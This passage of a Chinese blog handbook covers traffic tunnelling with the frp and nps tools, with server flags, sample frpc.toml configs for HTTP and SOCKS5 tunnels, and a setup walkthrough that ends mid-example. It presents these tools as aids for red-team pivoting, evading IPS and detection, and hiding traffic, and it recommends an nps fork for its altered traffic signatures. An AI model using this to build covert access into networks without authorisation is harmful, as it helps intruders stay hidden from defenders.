<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;default&quot;,&quot;zh-TW&quot;,&quot;en&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>流量隧道手册 | 方糖</title><meta name="author" content="方糖"><meta name="copyright" content="方糖"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="流量隧道，内网穿透">
<meta property="og:type" content="article">
<meta property="og:title" content="流量隧道手册">
<meta property="og:url" content="https://0a00.github.io/2024/02/20/%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93/index.html">
<meta property="og:site_name" content="方糖">
<meta property="og:description" content="流量隧道，内网穿透">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://0a00.github.io/imgs/bg.jpg">
<meta property="article:published_time" content="2024-02-20T05:35:00.000Z">
<meta property="article:modified_time" content="2024-02-20T05:41:35.977Z">
<meta property="article:author" content="方糖">
<meta property="article:tag" content="流量隧道">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0a00.github.io/imgs/bg.jpg"><link rel="shortcut icon" href="/imgs/gt.png"><link rel="canonical" href="https://0a00.github.io/2024/02/20/%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '流量隧道手册',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-02-20 13:41:35'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3738306_q9h4a254rm.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/rss2.xml" title="方糖" type="application/rss+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/imgs/gt.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-light fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas  fa-folder-open"></i><span> 分类</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archlinux/"><i class="fa-fw iconfont icon-archlinux"></i><span> Arch</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas  fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/images/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-light fa-book"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/imgs/bg.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="方糖"><img class="site-icon" src="/imgs/gt.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-light fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas  fa-folder-open"></i><span> 分类</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archlinux/"><i class="fa-fw iconfont icon-archlinux"></i><span> Arch</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas  fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/images/"><i class="fa-fw fas fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-light fa-book"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">流量隧道手册</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-20T05:35:00.000Z" title="发表于 2024-02-20 13:35:00">2024-02-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-20T05:41:35.977Z" title="更新于 2024-02-20 13:41:35">2024-02-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E5%B7%A7/">技巧</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E5%B7%A7/%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93/">流量隧道</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">11.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>42分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="流量隧道手册"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>奇奇怪怪</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一天开始了</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
</div>

<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024</p>
</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>02-20</p>
</div></div><div class='timeline-item-content'><aside>
</aside>
---

<h1 id="🐸-简介"><a href="#🐸-简介" class="headerlink" title="🐸 简介"></a>🐸 简介</h1><aside>
⚙ 文章针对代理隧道的分析，多种工具的选择与使用，以及对于安全行业人员的意义与方案，并在多种场景下进行测试使用，分析其特点，区别。

</aside>

<hr>
<h2 id="关于流量隧道-🌵"><a href="#关于流量隧道-🌵" class="headerlink" title="关于流量隧道 🌵"></a>关于流量隧道 🌵</h2><blockquote>
<p>流量隧道（Traffic Tunnel）是一种网络技术，用于将网络流量通过一个加密和隧道化的通道传输，以保护数据的安全性和隐私性。它可以用于各种目的，包括绕过网络限制、保护通信内容免受窃听、隐藏真实的网络流量等。</p>
</blockquote>
<p>流量隧道的工作原理是将原始的网络流量封装在另一个协议的数据包中，以隐藏原始数据的内容和目的地。这些封装的数据包经过加密和隧道化处理后，在网络上传输到目标地点，然后被解封和还原为原始的网络流量。</p>
<p>流量隧道可以通过多种协议实现，其中比较常见的包括虚拟专用网络（VPN）、代理服务器和TOR（The Onion Router）等。这些技术都可以创建一个安全的通道，使用户能够匿名访问互联网或绕过地理限制。</p>
<p>需要注意的是，流量隧道技术在某些情况下可能违反法律或网络使用政策，特别是在某些国家或组织中。在使用流量隧道技术之前，请确保遵守当地的法律法规，并尊重网络服务提供商的使用条款和政策。</p>
<blockquote>
</blockquote>
<hr>
<h2 id="使用流量隧道的意义-✍️"><a href="#使用流量隧道的意义-✍️" class="headerlink" title="使用流量隧道的意义 ✍️"></a>使用流量隧道的意义 ✍️</h2><ul>
<li>隐藏数据流量的真实源地址和目标地址。通过流量隧道,可以隐藏数据流经的真实网络路径,使得流量难以被追踪和监视。</li>
<li>逾越地域限制访问 blocked 网站。流量隧道可以将流量隧道出国外,从而实现跨越防火墙或地域限制访问 blocked 网站。</li>
<li>提高访问安全性。使用流量隧道可以加密传输数据流量,提高数据在传输过程中的保密性和完整性,防止中间人攻击。</li>
<li>缓解网络拥堵。通过流量隧道可以将流量定向转发到带宽充足的网络节点,有效利用较高速的国外网络线路,减轻源网络拥堵的压力。</li>
<li>实现网上匿名通信。通过流量隧道可以隐藏客户端真实IP,实现一定程度上的网上匿名访问,保护个人隐私。</li>
<li>避开地域限制。有些网站会根据访问用户的来源地域限制访问权限。通过流量隧道可以欺骗网站并隐藏真实地域,实现境外网站的完整访问。</li>
<li>绕过网络封锁，一些网络环境中可以使用特定端口，特定协议实现绕过，从而突破网络防火墙。</li>
</ul>
<h2 id="对于渗透测试红队-👨‍🏭"><a href="#对于渗透测试红队-👨‍🏭" class="headerlink" title="对于渗透测试红队 👨‍🏭"></a>对于渗透测试红队 👨‍🏭</h2><ul>
<li>隐瞒源地址,规避检测</li>
<li>实现内网渗透跳板</li>
<li>加强后渗透隐蔽性</li>
<li>绕过IPS防御</li>
<li>DNS 隧道</li>
<li>ICMP 隧道</li>
</ul>
<h2 id="正向代理反向代理"><a href="#正向代理反向代理" class="headerlink" title="正向代理反向代理"></a>正向代理反向代理</h2><blockquote>
<p><strong>正向代理和反向代理是两种常见的网络代理形式:</strong></p>
<p>正向代理(Forward Proxy):</p>
<ul>
<li>客户端直接连接到代理服务器,由代理服务器来连接外部服务和资源。</li>
<li>代理服务器位于客户端和目标服务器之间,它接受客户端的所有请求,然后向目标服务器发出请求并将响应返回给客户端。</li>
</ul>
<p>优点:可以隐藏客户端的真实IP地址,提供流量监控和内容过滤功能。</p>
<p>反向代理(Reverse Proxy):</p>
<ul>
<li>客户端直接连接到目标服务器,而非通过反向代理服务器。</li>
<li>反向代理服务器位于目标服务器前面,它向外界提供一致的接口,而后端可以部署多台服务器。</li>
</ul>
</blockquote>
<hr>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><blockquote>
<p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议，且支持 P2P 通信。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。<br>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
</blockquote>
<p>公网 IP 的节点部署 frp 服务端，实现将内网服务穿透到公网，功能特性</p>
<ul>
<li>客户端服务端通信支持 TCP、QUIC、KCP 以及 Websocket 等多种协议。</li>
<li>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间，降低请求延迟。</li>
<li>代理组间的负载均衡。</li>
<li>端口复用，多个服务通过同一个服务端端口暴露。</li>
<li>支持 P2P 通信，流量不经过服务器中转，充分利用带宽资源。</li>
<li>多个原生支持的客户端插件（静态文件查看，HTTPS&#x2F;HTTP 协议转换，HTTP、SOCK5 代理等），便于独立使用 frp 客户端完成某些工作。</li>
<li>高度扩展性的服务端插件系统，易于结合自身需求进行功能扩展。</li>
</ul>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><aside>
⚙ 下载地址：https://github.com/fatedier/frp/releases

</aside>

<ol>
<li>解压下载的压缩包。</li>
<li>将 <code>frpc</code> 复制到内网服务所在的机器上。客户端</li>
<li>将 <code>frps</code> 复制到拥有公网 IP 地址的机器上，并将它们放在任意目录。服务器端</li>
</ol>
<h3 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h3><blockquote>
<p><strong>frps</strong></p>
</blockquote>
<ul>
<li><code>completion</code>  为指定的shell生成自动完成脚本，例：<code>frps completion zsh</code></li>
<li><code>help</code> <code>-h  --help</code> 显示使用帮助，例：<code>frps help</code> ，<code>frps --log_level -h</code></li>
<li><code>verify</code>  验证配置是否有效，例：<code>frps verify -c frps.toml</code></li>
<li><code>--allow_ports string</code>   允许端口</li>
<li><code>--bind_addr string</code> 绑定的 ip 地址 (default “0.0.0.0”)</li>
<li><code>-p, --bind_port int</code>  绑定端口  (default 7000)</li>
<li><code>-c, --config string</code> 指定配置文件</li>
<li><code>--dashboard_addr string</code> 仪表盘地址 (default “0.0.0.0”)</li>
<li><code>--dashboard_port int</code> 仪表盘端口</li>
<li><code>--dashboard_pwd string</code> 仪表盘密码 (default “admin”)</li>
<li><code>--dashboard_user string</code> 仪表盘用户 (default “admin”)</li>
<li><code>--dashboard_tls_cert_file string</code> 仪表盘TLS证书文件</li>
<li><code>--dashboard_tls_key_file string</code> 仪表盘 TLS 密钥文件</li>
<li><code>--dashboard_tls_mode</code> 如果启用仪表盘TLS模式</li>
<li><code>--disable_log_color</code>  在控制台禁用日志颜色</li>
<li><code>--enable_prometheus</code> 启用 prometheus 仪表板</li>
<li><code>--kcp_bind_port int</code>   KCP绑定udp端口</li>
<li><code>--log_file string</code>   日志文件(默认”console”)</li>
<li><code>--log_level string</code>  日志级别(默认”info”)，可选，<code>trace debug info warn error</code></li>
<li><code>--log_max_days int</code>  日志最大天数(默认3)</li>
<li><code>--max_ports_per_client int</code>    每个端口的最大客户端数量</li>
<li><code>--proxy_bind_addr string</code>  代理绑定地址(默认为“0.0.0.0”)</li>
<li><code>--subdomain_host string</code>   子域主机</li>
<li><code>--tls_only</code>  仅使用 TLS</li>
<li><code>-t, --token string</code>   验证token</li>
<li><code>-v --version</code>     显示版本</li>
<li><code>--vhost_http_port int</code> vhost 的http 端口</li>
<li><code>--vhost_http_timeout int</code>  vhost HTTP响应头超时(默认60)</li>
<li><code>--vhost_https_port int</code>   vhost HTTPS端口</li>
</ul>
<blockquote>
<p><strong>frpc</strong></p>
</blockquote>
<ul>
<li><code>completion</code> 为指定的shell生成自动完成脚本 ，例：frpc completion bash</li>
<li><code>help</code>    查看帮助选项，<code>frpc help  or  frpc help http</code></li>
<li><code>http</code>    单个http代理运行frpc</li>
<li><code>https</code>   单个https代理运行frpc</li>
<li><code>nathole</code>  关于nathole的动作</li>
<li><code>reload</code> 热加载frpc配置</li>
<li><code>status</code>  所有代理状态概述</li>
<li><code>stcp</code>   使用单个stcp代理运行frpc</li>
<li><code>stop</code>  停止运行中的frpc</li>
<li><code>sudp</code>  使用单个sudp 代理运行frpc</li>
<li><code>tcp</code>  使用单个tcp代理运行frpc</li>
<li><code>tcpmux</code>  使用单个tcpmux代理运行frpc</li>
<li><code>udp</code>  使用单个udp代理运行frpc</li>
<li><code>verify</code> 验证配置是否有效</li>
<li><code>xtcp</code>  使用单个xtcp代理运行frpc</li>
<li><code>-c, --config string</code> 指定frpc配置文件 (default “.&#x2F;frpc.ini”)</li>
<li><code>--config_dir string config directory</code>   指定配置文件目录，为配置目录中的每个文件运行一个FRPC服务</li>
<li><code>-v</code>   显示版本</li>
<li>使用“<code>frpc [command] --help</code>”获取命令的更多信息。</li>
</ul>
<h3 id="常用方式"><a href="#常用方式" class="headerlink" title="常用方式"></a>常用方式</h3><blockquote>
<p><strong>建立 http 隧道进行内网穿透</strong></p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">**服务端**</span><br><span class="line">frps --bind_addr <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> -p <span class="number">7001</span> --kcp_bind_port <span class="number">7001</span>  监听端口</span><br><span class="line"></span><br><span class="line">**客户端配置文件 frpc -c frpc.<span class="property">toml</span></span><br><span class="line">frpc.<span class="property">toml</span> 配置文件内容**</span><br><span class="line"># 指定连接目标服务器的 ip 地址与端口</span><br><span class="line">serverAddr = <span class="string">&quot;you remote ip&quot;</span></span><br><span class="line">serverPort = port</span><br><span class="line"></span><br><span class="line"># 建立http隧道,隧道端口设置为<span class="number">7002</span>，tcp协议，数据加密，压缩，设置隧道连接账户密码</span><br><span class="line">[[proxies]]</span><br><span class="line">name = <span class="string">&quot;plugin_http_proxy&quot;</span></span><br><span class="line">type = <span class="string">&quot;tcp&quot;</span></span><br><span class="line">remotePort = <span class="number">7002</span></span><br><span class="line">transport.<span class="property">useEncryption</span> = <span class="literal">true</span></span><br><span class="line">transport.<span class="property">useCompression</span> = <span class="literal">true</span></span><br><span class="line">[proxies.<span class="property">plugin</span>]</span><br><span class="line">type = <span class="string">&quot;http_proxy&quot;</span></span><br><span class="line">httpUser = <span class="string">&quot;admin&quot;</span></span><br><span class="line">httpPassword = <span class="string">&quot;passwd&quot;</span></span><br><span class="line"></span><br><span class="line">运行后会在服务端看到<span class="number">7002</span>端口监听，为http隧道。连接后实现内网穿透，http隧道。</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>建立 Socks5 隧道进行内网穿透</strong></p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">**服务端**</span><br><span class="line">frps --bind_addr <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> -p <span class="number">7001</span> --kcp_bind_port <span class="number">7001</span> 监听端口</span><br><span class="line"></span><br><span class="line">**客户端配置文件 frpc -c frpc.<span class="property">toml</span></span><br><span class="line">frpc.<span class="property">toml</span> 配置文件内容**</span><br><span class="line">#指定服务端ip和端口</span><br><span class="line">serverAddr = <span class="string">&quot;you remote ip&quot;</span></span><br><span class="line">serverPort = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"># 设置socks5隧道，隧道端口<span class="number">7002</span>,tcp协议，数据加密，压缩，设置隧道账户，密码</span><br><span class="line">[[proxies]]</span><br><span class="line">name = <span class="string">&quot;plugin_socks5&quot;</span></span><br><span class="line">type = <span class="string">&quot;tcp&quot;</span></span><br><span class="line">remotePort = <span class="number">7002</span></span><br><span class="line">transport.<span class="property">useEncryption</span> = <span class="literal">true</span></span><br><span class="line">transport.<span class="property">useCompression</span> = <span class="literal">true</span></span><br><span class="line">[proxies.<span class="property">plugin</span>]</span><br><span class="line">type = <span class="string">&quot;socks5&quot;</span></span><br><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;passwd&quot;</span></span><br><span class="line"></span><br><span class="line">运行后会在服务端开启socks5代理。实现内网穿透，socks5代理隧道</span><br></pre></td></tr></table></figure>

<aside>
💢 代理类型，可选值为 tcp, udp, http, https, tcpmux, stcp, sudp, xtcp。

</aside>

<blockquote>
<p><strong>官方文档</strong><br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://gofrp.org/zh-cn/docs/">https://gofrp.org/zh-cn/docs/</a><br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
</blockquote>
<hr>
<h2 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h2><aside>
💢 nps是一款轻量级、高性能、功能强大的**内网穿透**代理服务器。
协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理…全平台兼容，支持web ui。

</aside>

<blockquote>
<p>安装：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a> 官方版本，多年没有更新，有漏洞，会被反制<strong>，</strong>不推荐<br>*<em><strong>安装</strong>：</em>*<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Q16G/npsmodify">https://github.com/Q16G/npsmodify</a>  二次开发魔改版，修复了漏洞，修改了流量特征。喜欢nps的可以尝试这个版本。<br>官方手册：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://ehang-io.github.io/nps/#/">https://ehang-io.github.io/nps/#/</a></p>
</blockquote>
<ul>
<li>首先下载 ： <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Q16G/npsmodify/releases">https://github.com/Q16G/npsmodify/releases</a>  下载对应版本</li>
<li>git clone <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Q16G/npsmodify">https://github.com/Q16G/npsmodify</a>  随后把项目clone 下来</li>
<li>（1）在使用服务端的时候需要down下来 cmd&#x2F;nps下的conf和web两个目录</li>
<li>（2）把conf和web两个目录和nps目录同级</li>
<li>（3）修改服务端密码（后期也许会支持md5、或者登陆后修改密码）最新版默认使用good.conf</li>
</ul>
<blockquote>
<p><strong>使用方式</strong></p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./linux_amd64_nps  启动nps服务端</span><br><span class="line">访问 服务端 <span class="number">8080</span> web页面登陆，默认账户密码 admin/<span class="number">123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>登陆后点击右侧客户端新增：填写备注，用户,密码，压缩,加密。根据自己需求填写。</li>
<li>随后点击客户端，点新增的客户端的加号+。会提示命令连接</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">sudo ./linux_amd64_npc -server=<span class="attr">localhost</span>:<span class="number">8024</span> -vkey=srsia6n0evfc9s3b -type=tcp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>TCP隧道</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">适用范围： ssh、远程桌面等tcp连接场景</span><br><span class="line">假设场景： 想通过访问公网服务器<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>的<span class="number">8001</span>端口，连接内网机器<span class="number">10.1</span><span class="number">.50</span><span class="number">.101</span>的<span class="number">22</span>端口，实现ssh连接</span><br><span class="line"></span><br><span class="line">在刚才创建的客户端隧道管理中添加一条tcp隧道，填写监听的端口（<span class="number">8001</span>）、内网目标ip和目标端口（<span class="number">10.1</span><span class="number">.50</span><span class="number">.101</span>:<span class="number">22</span>），保存。</span><br><span class="line"></span><br><span class="line">访问公网服务器ip（<span class="number">1.1</span><span class="number">.1</span><span 